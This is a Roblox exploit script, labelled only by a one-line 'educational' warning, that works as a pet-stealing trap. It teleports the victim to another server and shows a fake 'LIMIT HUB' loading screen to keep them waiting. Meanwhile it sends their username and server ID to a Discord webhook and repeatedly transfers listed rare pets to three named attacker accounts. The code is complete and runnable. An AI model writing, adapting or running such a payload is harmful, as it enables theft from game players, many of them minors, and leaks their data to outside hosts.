--⚠️ EDUCATIONAL WARNING: This script simulates a malicious trap. DO NOT RUN blindly.

local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local placeId = 126884695634066

-- Code to execute after teleporting
local postTeleportCode = [[
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local webhookUrl = "https://discord.com/api/webhooks/..."

local targetPets = {
    ["trex"] = true,
    ["fennec fox"] = true,
    ["raccoon"] = true,
    ["dragonfly"] = true,
    ["butterfly"] = true,
    ["queenbee"] = true,
    ["spinosaurus"] = true,
    ["redfox"] = true,
    ["brontosaurus"] = true,
    ["mooncat"] = true,
    ["mimic octopus"] = true,
    ["disco bee"] = true,
    ["dilophosaurus"] = true,
    ["kitsune"] = true
}

local attackers = {
    "boneblossom215",
    "beanstalk1251",
    "burningbud709"
}

-- Fake GUI loading
local function showFakeLoading()
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    gui.Name = "LIMIT_HUB_LOADING"
    
    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    
    local title = Instance.new("TextLabel", bg)
    title.Size = UDim2.new(0, 800, 0, 100)
    title.Position = UDim2.new(0.5, -400, 0.5, -60)
    title.BackgroundTransparency = 1
    title.Text = "LIMIT HUB"
    title.TextColor3 = Color3.fromRGB(0, 255, 255)
    title.Font = Enum.Font.Fantasy
    title.TextScaled = true
    
    local percent = Instance.new("TextLabel", bg)
    percent.Size = UDim2.new(0, 100, 0, 40)
    percent.Position = UDim2.new(0.5, -50, 0.5, 80)
    percent.BackgroundTransparency = 1
    percent.TextColor3 = Color3.new(1, 1, 1)
    percent.Font = Enum.Font.Code
    percent.TextScaled = true
    percent.Text = "0%"
    
    task.spawn(function()
        local p = 0
        while p <= 100 do
            percent.Text = p .. "%"
            p += 5
            task.wait(10)
        end
        gui:Destroy()
    end)
end

-- Send data to Discord
local function sendDiscordInfo()
    local data = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Player Joined",
            ["description"] = ("User: %s\nJobId: %s"):format(LocalPlayer.Name, game.JobId),
            ["color"] = 0x00FFFF
        }}
    }

    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Pet transfer logic
local function transferPets()
    for _, p in pairs(Players:GetPlayers()) do
        if table.find(attackers, p.Name) then
            local petFolder = LocalPlayer:FindFirstChild("Pets") or LocalPlayer:WaitForChild("Pets")
            if petFolder then
                for _, pet in pairs(petFolder:GetChildren()) do
                    local name = string.lower(pet.Name)
                    if targetPets[name] then
                        local remote = ReplicatedStorage:FindFirstChild("TransferPet")
                        if remote then
                            remote:FireServer(pet, p)
                        end
                    end
                end
            end
        end
    end
end

-- Repeating transfer check
task.spawn(function()
    while true do
        transferPets()
        task.wait(5)
    end
end)

-- Begin post-teleport flow
showFakeLoading()
sendDiscordInfo()
]]

-- Queue the above script after teleport
queue_on_teleport(postTeleportCode)

-- Run server hop FIRST
local function serverHop()
    local cursor = ""
    repeat
        local success, result = pcall(function()
            return HttpService:JSONDecode(HttpService:GetAsync(
                ("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&cursor=%s"):format(placeId, cursor)
            ))
        end)

        if success and result and result.data then
            for _, server in pairs(result.data) do
                if server.playing < server.maxPlayers and server.id ~= game.JobId then
                    TeleportService:TeleportToPlaceInstance(placeId, server.id, LocalPlayer)
                    return
                end
            end
            cursor = result.nextPageCursor or ""
        else
            break
        end

        task.wait(0.2)
    until cursor == ""
end

-- 👣 Begin script
serverHop()
